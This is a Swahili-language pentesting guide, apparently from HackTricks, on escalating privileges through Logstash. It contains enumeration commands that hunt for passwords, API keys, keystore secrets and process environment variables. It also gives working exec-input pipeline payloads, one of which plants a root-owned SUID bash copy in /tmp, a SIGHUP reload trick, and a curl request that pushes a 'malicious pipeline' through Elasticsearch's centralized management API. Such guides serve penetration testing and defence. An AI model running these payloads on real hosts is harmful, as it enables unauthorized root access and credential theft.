# Kuongeza Marupurupu ya Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash hutumika **kukusanya, kubadilisha na kusambaza kumbukumbu (logs)** kupitia mfumo unaojulikana kama **pipelines**. Pipelines hizi zinajumuisha hatua za **input**, **filter** na **output**.<sup>[[4]](#references)</sup> Kipengele cha kuvutia hujitokeza Logstash inapoendeshwa kwenye mashine iliyoathiriwa.

### Usanidi wa Pipeline

Kwenye usakinishaji wa vifurushi vya Debian na RPM, pipelines husanidiwa kupitia **/etc/logstash/pipelines.yml**, ambayo huorodhesha mahali zilipo faili za usanidi wa pipeline; usambazaji mwingine huweka `pipelines.yml` kwenye saraka ya Logstash ya `path.settings`.<sup>[[5]](#references)[[6]](#references)</sup>

```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
  path.config: "/usr/share/logstash/pipeline/1*.conf"
  pipeline.workers: 6
```

Faili hii inaonyesha mahali zilipo faili za **.conf** zenye usanidi wa pipeline. Unapotumia **Elasticsearch output**, kagua mipangilio ya `user`/`password`, `cloud_auth`, au `api_key`; ruhusa halisi za akaunti hutegemea Elasticsearch. Glob ya `path.config` hupakia kila faili inayolingana kwa pipeline hiyo.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Logstash ikianzishwa na `-f <directory>` badala ya `pipelines.yml`, `-f` hutangulia na **faili zote zilizo ndani ya directory hiyo huunganishwa kwa mpangilio wa alfabeti na kuchanganuliwa kama config moja**.<sup>[[6]](#references)[[7]](#references)</sup> Hili lina athari 2 za kiushambuliaji:

- Faili iliyowekwa kama `000-input.conf` au `zzz-output.conf` inaweza kubadilisha jinsi pipeline ya mwisho inavyoundwa
- Faili yenye hitilafu inaweza kusababisha config iliyounganishwa ishindwe kuthibitishwa; wakati wa reload, Logstash huhifadhi pipeline ya awali, kwa hivyo thibitisha payloads kabla ya kutegemea auto-reload.<sup>[[1]](#references)</sup>

### Enumeration ya Haraka kwenye Host Iliyodhibitiwa

Kwenye host ambayo Logstash imesakinishwa, kagua kwa haraka:

```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

Pia angalia kama API ya ufuatiliaji ya ndani inaweza kufikiwa. Kwa chaguomsingi, husikiliza kwenye **127.0.0.1:9600**, jambo ambalo kwa kawaida linatosha baada ya kupata ufikiaji wa host.<sup>[[8]](#references)</sup>

```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```

Ncha hizi hufichua ID na mipangilio ya pipeline, vipimo vya runtime, na vihesabu vya mafanikio/kushindwa kwa kupakia upya config, hivyo kusaidia kuthibitisha kama mabadiliko yamekubaliwa.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Ikiwa credential iliyopatikana inalenga **Elasticsearch**, angalia [ukurasa huu mwingine kuhusu Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### File input inayolisha matokeo ya command inayobadilika

Config ya pipeline inaweza kuwa ya kusoma pekee kwa mtumiaji wa sasa, huku [file input](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-file) yake ikifuatilia path ambayo mtumiaji anaweza kuandika. Fuatilia pipeline iliyopakiwa kuanzia input hiyo kupitia [Grok field capture](https://www.elastic.co/docs/reference/logstash/plugins/plugins-filters-grok) yoyote hadi kwenye [exec output](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-exec). Exec output hupitisha `command` yake kupitia shell na kuweka thamani za `%{field}` bila kusafisha herufi maalum za shell. Path ya input inayoweza kuandikwa ni kidokezo cha privilege ikiwa tu service inatumia identity ya juu zaidi, faili ya mtumiaji inaweza kweli kuingia kwenye input inayofuatiliwa, filters na masharti ya output vinaelekeza maudhui yake kwenye field ya command, na output plugin hiyo imesakinishwa na inatumika. Kagua ruhusa za kutafuta/kuandika kwenye directory, hali ya ufuatiliaji ya file input, na akaunti halisi ya service kila kimoja kivyake; usiandike test event wala kuendesha output wakati wa uchunguzi wa kimya.

### Kuongeza Privilege kupitia Pipelines Zinazoweza Kuandikwa

Ili kujaribu kuongeza privilege, kwanza tambua mtumiaji ambaye Logstash service inaendeshwa chini yake kwa kweli; usidhani kuwa ni root au mtumiaji wa **logstash**. Hakikisha unatimiza **kigezo kimoja** kati ya hivi:

- Una **ruhusa ya kuandika** kwenye faili ya pipeline **.conf** **au**
- Faili ya **/etc/logstash/pipelines.yml** inatumia wildcard, na unaweza kuandika kwenye folda lengwa.<sup>[[6]](#references)[[7]](#references)</sup>

Zaidi ya hayo, **sharti moja** kati ya haya lazima litimizwe:

- Una uwezo wa kuwasha upya Logstash service **au**
- Faili ya **/etc/logstash/logstash.yml** imewekewa **config.reload.automatic: true**.<sup>[[1]](#references)[[15]](#references)</sup>

Ikiwa config ina wildcard, kuunda faili inayolingana na wildcard hiyo huruhusu kutekeleza command.<sup>[[7]](#references)[[9]](#references)</sup> Kwa mfano:

```bash
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

Hapa, **interval** huamua marudio ya utekelezaji kwa sekunde. Katika mfano uliotolewa, amri ya **whoami** huendeshwa kila baada ya sekunde 120, huku matokeo yake yakielekezwa kwenye **/tmp/output.log**.<sup>[[9]](#references)</sup>

Kwa **config.reload.automatic: true** katika **/etc/logstash/logstash.yml**, Logstash itatambua na kutumia kiotomatiki usanidi mpya au uliobadilishwa wa pipeline bila kuhitaji kuwashwa upya.<sup>[[1]](#references)[[15]](#references)</sup> Ikiwa hakuna wildcard, usanidi uliopo bado unaweza kubadilishwa, lakini inashauriwa kuwa mwangalifu ili kuepuka usumbufu.

### Payloads za Pipeline Zinazoaminika Zaidi

Plugin ya ingizo ya `exec` bado inafanya kazi katika matoleo ya sasa na inahitaji `interval` au `schedule`. Hutekeleza kwa **forking** JVM ya Logstash, kwa hivyo ikiwa kumbukumbu ni haba, payload yako inaweza kushindwa kwa `ENOMEM` badala ya kutekelezwa kimyakimya.<sup>[[9]](#references)</sup>

Huduma ikiwa na haki za kutosha kuunda faili ya SUID inayomilikiwa na root, payload ya vitendo ya privilege escalation ni ile inayoacha artifact ya kudumu:

```bash
input {
  exec {
    command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
    interval => 300
  }
}
output {
  null {}
}
```

Ikiwa huna ruhusa za kuwasha upya lakini unaweza kutuma signal kwa mchakato, Logstash pia inasaidia upakiaji upya unaochochewa na **SIGHUP** kwenye mifumo inayofanana na Unix:<sup>[[1]](#references)</sup>

```bash
kill -SIGHUP $(pgrep -f logstash)
```

Kumbuka kwamba si kila plugin inayoweza kupakiwa upya. Kwa mfano, input ya **stdin** huzuia upakiaji upya wa kiotomatiki, kwa hivyo usidhani kwamba `config.reload.automatic` itatumia mabadiliko yako kila wakati.<sup>[[1]](#references)</sup>

### Kuiba Siri kutoka kwa Logstash

Kabla ya kuzingatia utekelezaji wa code pekee, kusanya data ambayo Logstash tayari inaweza kufikia:

- Credentials zinaweza kupatikana kwenye outputs za `elasticsearch {}`, URL/mipangilio ya `http_poller`, inputs za JDBC, au mipangilio inayohusiana na cloud; plugins hizi zina sehemu za credentials zinazofaa kutafutwa.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Mipangilio salama inaweza kuwa kwenye **`/etc/logstash/logstash.keystore`** au saraka nyingine ya `path.settings`.<sup>[[5]](#references)[[10]](#references)</sup>
- Nenosiri la keystore linaweza kutolewa kupitia **`LOGSTASH_KEYSTORE_PASS`**, na usakinishaji wa RPM/DEB hupakia vigezo vya mazingira vya huduma kutoka **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- Upanuzi wa vigezo vya mazingira kwa kutumia `${VAR}` hutatuliwa Logstash inapoanza, kwa hivyo inafaa kukagua mazingira ya huduma.<sup>[[14]](#references)</sup>

Ukaguzi unaofaa:

```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```

Hili pia linafaa kuangaliwa kwa sababu **CVE-2023-46672** ilionyesha kwamba, katika hali maalum, Logstash ilihifadhi taarifa nyeti kwenye logi zake, zikiwemo siri zilizohifadhiwa kwenye keystore yake na kurejelewa kwenye usanidi; kagua logi za zamani za Logstash na maingizo ya `journald` ikiwa hali hizo zinaweza kutumika.<sup>[[3]](#references)</sup>

### Matumizi Mabaya ya Usimamizi wa Pipeline wa Kati

Katika baadhi ya mazingira, host **haitumii** kabisa faili za `.conf` za ndani. Ikiwa **`xpack.management.enabled: true`** imesanidiwa, Logstash inaweza kupakua pipeline zinazosimamiwa kwa pamoja kutoka Elasticsearch/Kibana, na baada ya hali hii kuwezeshwa, usanidi wa pipeline wa ndani hauwi tena chanzo cha ukweli.<sup>[[2]](#references)</sup>

Hii inamaanisha njia tofauti ya shambulio:

1. Pata tena credentials za Elastic kutoka kwenye mipangilio ya ndani ya Logstash, keystore, au logi.<sup>[[3]](#references)[[10]](#references)</sup>
2. Thibitisha ikiwa akaunti ina ruhusa ya cluster ya **`manage_logstash_pipelines`**.<sup>[[16]](#references)</sup>
3. Unda au badilisha pipeline inayosimamiwa kwa pamoja ili host ya Logstash itekeleze payload yako kwenye muda wake unaofuata wa ukaguzi.<sup>[[2]](#references)[[16]](#references)</sup>

API ya Elasticsearch inayotumika kwa kipengele hiki ni:<sup>[[16]](#references)</sup>

```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
  -H 'Content-Type: application/json' \
  -u user:password \
  -d '{
    "description": "malicious pipeline",
    "last_modified": "2026-01-02T02:50:51.250Z",
    "username": "user",
    "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
    "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
    "pipeline_settings": {
      "pipeline.workers": 1,
      "pipeline.batch.size": 1,
      "pipeline.batch.delay": 50,
      "queue.type": "memory",
      "queue.max_bytes": "1gb",
      "queue.checkpoint.writes": 1024
    }
  }'
```

Hili ni muhimu hasa wakati faili za ndani ni za kusoma tu, lakini Logstash tayari imesajiliwa ili ichukue pipelines kutoka kwenye seva za mbali.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Kupakia upya faili ya usanidi](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Kusanidi usimamizi wa pipeline wa kati](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Sasisho la usalama la Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Kuunda pipeline ya Logstash](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Mpangilio wa saraka ya Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Pipelines nyingi](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Kuendesha Logstash kutoka kwenye mstari wa amri](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: Kufuatilia Logstash kwa kutumia APIs](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Plugin ya ingizo ya Exec](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Keystore ya siri kwa mipangilio salama](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Plugin ya matokeo ya Elasticsearch](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Plugin ya ingizo ya Http_poller](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Plugin ya ingizo ya Jdbc](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Kutumia vigezo vya mazingira](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Kuunda au kusasisha pipeline ya Logstash](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Kupata mipangilio ya pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Kupata takwimu za pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
